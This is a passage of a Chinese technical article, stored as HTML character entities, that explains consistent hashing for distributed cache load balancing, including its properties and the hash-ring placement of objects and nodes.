hash()&#x7B97;&#x6CD5;&#xFF0C;&#x5BF9;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;hash()&#x503C;&#x6309;N&#x53D6;&#x6A21;&#xFF0C;&#x5F97;&#x5230;&#x4F59;&#x6570;i&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BF7;&#x6C42;&#x5206;&#x53D1;&#x5230;&#x7F16;&#x53F7;&#x4E3A;i&#x7684;&#x673A;&#x5668;&#x3002;&#x4F46;&#x8FD9;&#x6837;&#x7684;&#x7B97;&#x6CD5;&#x65B9;&#x6CD5;&#x5B58;&#x5728;&#x81F4;&#x547D;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x843D;&#x5728;&#x8BE5;&#x673A;&#x5668;&#x7684;&#x8BF7;&#x6C42;&#x5C31;&#x65E0;&#x6CD5;&#x5F97;&#x5230;&#x6B63;&#x786E;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x65F6;&#x9700;&#x8981;&#x5C06;&#x5F53;&#x6389;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x7B97;&#x6CD5;&#x4ECE;&#x53BB;&#x9664;&#xFF0C;&#x6B64;&#x65F6;&#x5019;&#x4F1A;&#x6709;(N-1)/N&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;;&#x5982;&#x679C;&#x65B0;&#x589E;&#x4E00;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x4F1A;&#x6709;N /(N+1)&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x3002;&#x5BF9;&#x4E8E;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#xFF0C;&#x8FD9;&#x901A;&#x5E38;&#x662F;&#x4E0D;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x98A0;&#x7C38;(&#x56E0;&#x4E3A;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5927;&#x91CF;&#x7F13;&#x5B58;&#x7684;&#x5931;&#x6548;&#x6216;&#x8005;&#x6570;&#x636E;&#x9700;&#x8981;&#x8F6C;&#x79FB;)&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x4E00;&#x4E2A;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7B56;&#x7565;&#xFF0C;&#x4F7F;&#x5F97;&#x53D7;&#x5230;&#x5F71;&#x54CD;&#x7684;&#x8BF7;&#x6C42;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5C11;&#x5462;? &#x5728;Memcached&#x3001;Key-Value Store &#x3001;Bittorrent DHT&#x3001;LVS&#x4E2D;&#x90FD;&#x91C7;&#x7528;&#x4E86;Consistent Hashing&#x7B97;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Consistent Hashing &#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x9996;&#x9009;&#x7B97;&#x6CD5;&#x3002; &#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x662F;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x540E;&#xFF0C;&#x54C8;&#x5E0C;&#x8868;&#x69FD;&#x4F4D;&#x6570;&#xFF08;&#x5927;&#x5C0F;&#xFF09;&#x7684;&#x6539;&#x53D8;&#x5E73;&#x5747;&#x53EA;&#x9700;&#x8981;&#x5BF9; K/n &#x4E2A;&#x5173;&#x952E;&#x5B57;&#x91CD;&#x65B0;&#x6620;&#x5C04;&#xFF0C;&#x5176;&#x4E2D; K&#x662F;&#x5173;&#x952E;&#x5B57;&#x7684;&#x6570;&#x91CF;&#xFF0C;n&#x662F;&#x69FD;&#x4F4D;&#x6570;&#x91CF;&#x3002;&#x7136;&#x800C;&#x5728;&#x4F20;&#x7EDF;&#x7684;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#xFF0C;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x69FD;&#x4F4D;&#x7684;&#x51E0;&#x4E4E;&#x9700;&#x8981;&#x5BF9;&#x6240;&#x6709;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x91CD;&#x65B0;&#x6620;&#x5C04;&#x3002; &#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7531;MIT&#x7684;Karger&#x53CA;&#x5176;&#x5408;&#x4F5C;&#x8005;&#x63D0;&#x51FA;&#xFF0C;&#x73B0;&#x5728;&#x8FD9;&#x4E00;&#x601D;&#x60F3;&#x5DF2;&#x7ECF;&#x6269;&#x5C55;&#x5230;&#x5176;&#x5B83;&#x9886;&#x57DF;&#x3002;&#x5728;&#x8FD9;&#x7BC7;1997&#x5E74;&#x53D1;&#x8868;&#x7684;&#x5B66;&#x672F;&#x8BBA;&#x6587;&#x4E2D;&#x4ECB;&#x7ECD;&#x4E86;&#x201C;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x201D;&#x5982;&#x4F55;&#x5E94;&#x7528;&#x4E8E;&#x7528;&#x6237;&#x6613;&#x53D8;&#x7684;&#x5206;&#x5E03;&#x5F0F;Web&#x670D;&#x52A1;&#x4E2D;&#x3002;&#x54C8;&#x5E0C;&#x8868;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x5728;&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x8282;&#x70B9;&#x53EA;&#x9700;&#x8981;&#x79FB;&#x52A8; K/n&#x9879;&#x3002; &#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E5F;&#x53EF;&#x7528;&#x4E8E;&#x5B9E;&#x73B0;&#x5065;&#x58EE;&#x7F13;&#x5B58;&#x6765;&#x51CF;&#x5C11;&#x5927;&#x578B;Web&#x5E94;&#x7528;&#x4E2D;&#x7CFB;&#x7EDF;&#x90E8;&#x5206;&#x5931;&#x6548;&#x5E26;&#x6765;&#x7684;&#x8D1F;&#x9762;&#x5F71;&#x54CD;&#x3002; &#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7684;&#x6982;&#x5FF5;&#x8FD8;&#x88AB;&#x5E94;&#x7528;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6563;&#x5217;&#x8868;&#xFF08;DHT&#xFF09;&#x7684;&#x8BBE;&#x8BA1;&#x3002;DHT&#x4F7F;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x6765;&#x5212;&#x5206;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x7684;&#x8282;&#x70B9;&#x3002;&#x6240;&#x6709;&#x5173;&#x952E;&#x5B57;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x8986;&#x76D6;&#x7F51;&#x7EDC;&#x9AD8;&#x6548;&#x5730;&#x5B9A;&#x4F4D;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x3002; &#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x907F;&#x514D;&#x4E0A;&#x9762;&#x6240;&#x8BF4;&#x5230;&#x7684;&#x65B0;&#x589E;&#x6216;&#x51CF;&#x5C11;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5927;&#x91CF;&#x670D;&#x52A1;&#x5668;&#x7F13;&#x5B58;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x66F4;&#x65B0;&#x7684;&#x95EE;&#x9898;&#x3002; &#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x5C3D;&#x53EF;&#x80FD;&#x4F7F;&#x540C;&#x4E00;&#x4E2A;&#x8D44;&#x6E90;&#x6620;&#x5C04;&#x5230;&#x540C;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8981;&#x6C42;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5C3D;&#x91CF;&#x5206;&#x62C5;&#x5B58;&#x50A8;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7F13;&#x5B58;&#x8D44;&#x6E90;&#x3002;&#x51CF;&#x5C11;&#x4E00;&#x53F0;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x4E5F;&#x53EF;&#x4EE5;&#x5C3D;&#x91CF;&#x5206;&#x62C5;&#x5B58;&#x50A8;&#x5B83;&#x7684;&#x7F13;&#x5B58;&#x8D44;&#x6E90;&#x3002; &#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#x662F;&#x5C06;&#x6BCF;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x54C8;&#x5E0C;&#x503C;&#x57DF;&#x533A;&#x95F4;&#x5173;&#x8054;&#x8D77;&#x6765;&#xFF0C;&#x5176;&#x4E2D;&#x533A;&#x95F4;&#x8FB9;&#x754C;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x5E94;&#x7684;&#x54C8;&#x5E0C;&#x503C;&#x6765;&#x51B3;&#x5B9A;&#x3002;&#xFF08;&#x5B9A;&#x4E49;&#x533A;&#x95F4;&#x7684;&#x54C8;&#x5E0C;&#x51FD;&#x6570;&#x4E0D;&#x4E00;&#x5B9A;&#x548C;&#x8BA1;&#x7B97;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x54C8;&#x5E0C;&#x503C;&#x7684;&#x51FD;&#x6570;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x662F;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x7684;&#x8303;&#x56F4;&#x9700;&#x8981;&#x5339;&#x914D;&#x3002;&#xFF09;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x79FB;&#x9664;&#xFF0C;&#x5219;&#x5B83;&#x4F1A;&#x4ECE;&#x5BF9;&#x5E94;&#x7684;&#x533A;&#x95F4;&#x4F1A;&#x88AB;&#x5E76;&#x5165;&#x5230;&#x90BB;&#x8FD1;&#x7684;&#x533A;&#x95F4;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x6539;&#x53D8;&#x3002; &#x76F8;&#x5173;&#x5B9E;&#x73B0;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x5C06;&#x6BCF;&#x4E2A;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x5230;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x7CFB;&#x7EDF;&#x518D;&#x5C06;&#x53EF;&#x7528;&#x7684;&#x8282;&#x70B9;&#x673A;&#x5668;&#x6620;&#x5C04;&#x5230;&#x5706;&#x73AF;&#x7684;&#x4E0D;&#x540C;&#x4F4D;&#x7F6E;&#x3002; &#x67E5;&#x627E;&#x67D0;&#x4E2A;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x7684;&#x673A;&#x5668;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x4E00;&#x81F4;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x4F4D;&#x7F6E;&#xFF0C;&#x6CBF;&#x7740;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x67E5;&#x627E;&#x76F4;&#x5230;&#x9047;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x673A;&#x5668;&#xFF0C;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x5373;&#x4E3A;&#x5BF9;&#x8C61;&#x5E94;&#x8BE5;&#x4FDD;&#x5B58;&#x7684;&#x4F4D;&#x7F6E;&#x3002; &#x5220;&#x9664;&#x4E00;&#x53F0;&#x8282;&#x70B9;&#x673A;&#x5668;&#x65F6;&#xFF0C;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x4FDD;&#x5B58;&#x7684;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x90FD;&#x8981;&#x79FB;&#x52A8;&#x5230;&#x4E0B;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x3002;&#x6DFB;&#x52A0;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5230;&#x5706;&#x73AF;&#x8FB9;&#x4E0A;&#x67D0;&#x4E2A;&#x70B9;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x70B9;&#x7684;&#x4E0B;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x9700;&#x8981;&#x5C06;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x524D;&#x5BF9;&#x5E94;&#x7684;&#x5BF9;&#x8C61;&#x79FB;&#x52A8;&#x5230;&#x65B0;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x66F4;&#x6539;&#x5BF9;&#x8C61;&#x5728;&#x8282;&#x70B9;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x6574;&#x8282;&#x70B9;&#x673A;&#x5668;&#x7684;&#x4F4D;&#x7F6E;&#x6765;&#x5B9E;&#x73B0;&#x3002; &#x76F8;&#x5173;&#x7279;&#x6027;&#x4E00;&#x81F4;&#x6027;hash&#x7B97;&#x6CD5;&#x63D0;&#x51FA;&#x4E86;&#x5728;&#x52A8;&#x6001;&#x53D8;&#x5316;&#x7684;Cache&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5224;&#x5B9A;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x597D;&#x574F;&#x7684;&#x56DB;&#x4E2A;&#x5B9A;&#x4E49;&#xFF1A; &#x5E73;&#x8861;&#x6027;(Balance)&#x5E73;&#x8861;&#x6027;&#x662F;&#x6307;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x80FD;&#x591F;&#x5C3D;&#x53EF;&#x80FD;&#x5206;&#x5E03;&#x5230;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#x7A7A;&#x95F4;&#x90FD;&#x5F97;&#x5230;&#x5229;&#x7528;&#x3002;&#x5F88;&#x591A;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x90FD;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E00;&#x6761;&#x4EF6;&#x3002; &#x5355;&#x8C03;&#x6027;(Monotonicity)&#x5355;&#x8C03;&#x6027;&#x662F;&#x6307;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#x901A;&#x8FC7;&#x54C8;&#x5E0C;&#x5206;&#x6D3E;&#x5230;&#x4E86;&#x76F8;&#x5E94;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#xFF0C;&#x53C8;&#x6709;&#x65B0;&#x7684;&#x7F13;&#x51B2;&#x52A0;&#x5165;&#x5230;&#x7CFB;&#x7EDF;&#x4E2D;&#x3002;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x5E94;&#x80FD;&#x591F;&#x4FDD;&#x8BC1;&#x539F;&#x6709;&#x5DF2;&#x5206;&#x914D;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x539F;&#x6709;&#x7684;&#x6216;&#x8005;&#x65B0;&#x7684;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x65E7;&#x7684;&#x7F13;&#x51B2;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x5176;&#x4ED6;&#x7F13;&#x51B2;&#x533A;&#x3002; &#x5206;&#x6563;&#x6027;(Spread)&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x7EC8;&#x7AEF;&#x6709;&#x53EF;&#x80FD;&#x770B;&#x4E0D;&#x5230;&#x6240;&#x6709;&#x7684;&#x7F13;&#x51B2;&#xFF0C;&#x800C;&#x662F;&#x53EA;&#x80FD;&#x770B;&#x5230;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x3002;&#x5F53;&#x7EC8;&#x7AEF;&#x5E0C;&#x671B;&#x901A;&#x8FC7;&#x54C8;&#x5E0C;&#x8FC7;&#x7A0B;&#x5C06;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x7F13;&#x51B2;&#x4E0A;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x540C;&#x7EC8;&#x7AEF;&#x6240;&#x89C1;&#x7684;&#x7F13;&#x51B2;&#x8303;&#x56F4;&#x6709;&#x53EF;&#x80FD;&#x4E0D;&#x540C;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x54C8;&#x5E0C;&#x7684;&#x7ED3;&#x679C;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x6700;&#x7EC8;&#x7684;&#x7ED3;&#x679C;&#x662F;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x88AB;&#x4E0D;&#x540C;&#x7684;&#x7EC8;&#x7AEF;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x663E;&#x7136;&#x662F;&#x5E94;&#x8BE5;&#x907F;&#x514D;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x5BFC;&#x81F4;&#x76F8;&#x540C;&#x5185;&#x5BB9;&#x88AB;&#x5B58;&#x50A8;&#x5230;&#x4E0D;&#x540C;&#x7F13;&#x51B2;&#x4E2D;&#x53BB;&#xFF0C;&#x964D;&#x4F4E;&#x4E86;&#x7CFB;&#x7EDF;&#x5B58;&#x50A8;&#x7684;&#x6548;&#x7387;&#x3002;&#x5206;&#x6563;&#x6027;&#x7684;&#x5B9A;&#x4E49;&#x5C31;&#x662F;&#x4E0A;&#x8FF0;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#x7684;&#x4E25;&#x91CD;&#x7A0B;&#x5EA6;&#x3002;&#x597D;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5E94;&#x80FD;&#x591F;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C3D;&#x91CF;&#x964D;&#x4F4E;&#x5206;&#x6563;&#x6027;&#x3002; &#x8D1F;&#x8F7D;(Load)&#x8D1F;&#x8F7D;&#x95EE;&#x9898;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x4ECE;&#x53E6;&#x4E00;&#x4E2A;&#x89D2;&#x5EA6;&#x770B;&#x5F85;&#x5206;&#x6563;&#x6027;&#x95EE;&#x9898;&#x3002;&#x65E2;&#x7136;&#x4E0D;&#x540C;&#x7684;&#x7EC8;&#x7AEF;&#x53EF;&#x80FD;&#x5C06;&#x76F8;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x800C;&#x8A00;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x88AB;&#x4E0D;&#x540C;&#x7684;&#x7528;&#x6237;&#x6620;&#x5C04;&#x4E3A;&#x4E0D;&#x540C;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x4E0E;&#x5206;&#x6563;&#x6027;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E5F;&#x662F;&#x5E94;&#x5F53;&#x907F;&#x514D;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x597D;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5E94;&#x80FD;&#x591F;&#x5C3D;&#x91CF;&#x964D;&#x4F4E;&#x7F13;&#x51B2;&#x7684;&#x8D1F;&#x8377;&#x3002; &#x63A5;&#x4E0B;&#x6765;&#x4E3B;&#x8981;&#x8BB2;&#x89E3;&#x4E00;&#x4E0B;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x5177;&#x4F53;&#x662F;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#x7684;. &#x73AF;&#x5F62;Hash&#x7A7A;&#x95F4;&#x6309;&#x7167;&#x5E38;&#x7528;&#x7684;hash&#x7B97;&#x6CD5;&#x6765;&#x5C06;&#x5BF9;&#x5E94;&#x7684;key&#x54C8;&#x5E0C;&#x5230;&#x4E00;&#x4E2A;&#x5177;&#x6709;2^32&#x6B21;&#x65B9;&#x4E2A;&#x6876;&#x7684;&#x7A7A;&#x95F4;&#x4E2D;&#xFF0C;&#x5373;0~(2^32)-1&#x7684;&#x6570;&#x5B57;&#x7A7A;&#x95F4;&#x4E2D;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x6570;&#x5B57;&#x5934;&#x5C3E;&#x76F8;&#x8FDE;&#xFF0C;&#x60F3;&#x8C61;&#x6210;&#x4E00;&#x4E2A;&#x95ED;&#x5408;&#x7684;&#x73AF;&#x5F62;&#x3002;&#x5982;&#x4E0B;&#x56FE; &#x628A;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;hash&#x7B97;&#x6CD5;&#x5904;&#x7406;&#x540E;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C06;object1&#x3001;object2&#x3001;object3&#x3001;object4&#x56DB;&#x4E2A;&#x5BF9;&#x8C61;&#x901A;&#x8FC7;&#x7279;&#x5B9A;&#x7684;Hash&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x51FA;&#x5BF9;&#x5E94;&#x7684;key&#x503C;&#xFF0C;&#x7136;&#x540E;&#x6563;&#x5217;&#x5230;Hash&#x73AF;&#x4E0A;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;Hash(object1) = key1&#xFF1B;Hash(object2) = key2&#xFF1B;Hash(object3) = key3&#xFF1B;Hash(object4) = key4&#xFF1B; &#x5C06;&#x673A;&#x5668;&#x901A;&#x8FC7;hash&#x7B97;&#x6CD5;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E0A;&#x5728;&#x91C7;&#x7528;&#x4E00;&#x81F4;&#x6027;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x96C6;&#x7FA4;&#x4E2D;&#x5C06;&#x65B0;&#x7684;&#x673A;&#x5668;&#x52A0;&#x5165;&#xFF0C;&#x5176;&#x539F;&#x7406;&#x662F;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x4E0E;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x4E00;&#x6837;&#x7684;Hash&#x7B97;&#x6CD5;&#x5C06;&#x673A;&#x5668;&#x4E5F;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF08;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x673A;&#x5668;&#x7684;hash&#x8BA1;&#x7B97;&#x662F;&#x91C7;&#x7528;&#x673A;&#x5668;&#x7684;IP&#x6216;&#x8005;&#x673A;&#x5668;&#x552F;&#x4E00;&#x7684;&#x522B;&#x540D;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x503C;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4EE5;&#x987A;&#x65F6;&#x9488;&#x7684;&#x65B9;&#x5411;&#x8BA1;&#x7B97;&#xFF0C;&#x5C06;&#x6240;&#x6709;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x5230;&#x79BB;&#x81EA;&#x5DF1;&#x6700;&#x8FD1;&#x7684;&#x673A;&#x5668;&#x4E2D;&#x3002;&#x5047;&#x8BBE;&#x73B0;&#x5728;&#x6709;NODE1&#xFF0C;NODE2&#xFF0C;NODE3&#x4E09;&#x53F0;&#x673A;&#x5668;&#xFF0C;&#x901A;&#x8FC7;Hash&#x7B97;&#x6CD5;&#x5F97;&#x5230;&#x5BF9;&#x5E94;&#x7684;KEY&#x503C;&#xFF0C;&#x6620;&#x5C04;&#x5230;&#x73AF;&#x4E2D;&#xFF0C;&#x5176;&#x793A;&#x610F;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;Hash(NODE1) = KEY1;Hash(NODE2) = KEY2;Hash(NODE3) = KEY3; &#x901A;&#x8FC7;&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x5BF9;&#x8C61;&#x4E0E;&#x673A;&#x5668;&#x5904;&#x4E8E;&#x540C;&#x4E00;&#x54C8;&#x5E0C;&#x7A7A;&#x95F4;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x6309;&#x987A;&#x65F6;&#x9488;&#x8F6C;&#x52A8;object1&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE1&#x4E2D;&#xFF0C;object3&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE2&#x4E2D;&#xFF0C;object2&#x3001;object4&#x5B58;&#x50A8;&#x5230;&#x4E86;NODE3&#x4E2D;&#x3002;&#x5728;&#x8FD9;&#x6837;&#x7684;&#x90E8;&#x7F72;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;hash&#x73AF;&#x662F;&#x4E0D;&#x4F1A;&#x53D8;&#x66F4;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x901A;&#x8FC7;&#x7B97;&#x51FA;&#x5BF9;&#x8C61;&#x7684;hash&#x503C;&#x5C31;&#x80FD;&#x5FEB;&#x901F;&#x7684;&#x5B9A;&#x4F4D;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x673A;&#x5668;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x627E;&#x5230;&#x5BF9;&#x8C61;&#x771F;&#x6B63;&#x7684;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;&#x4E86;&#x3002; 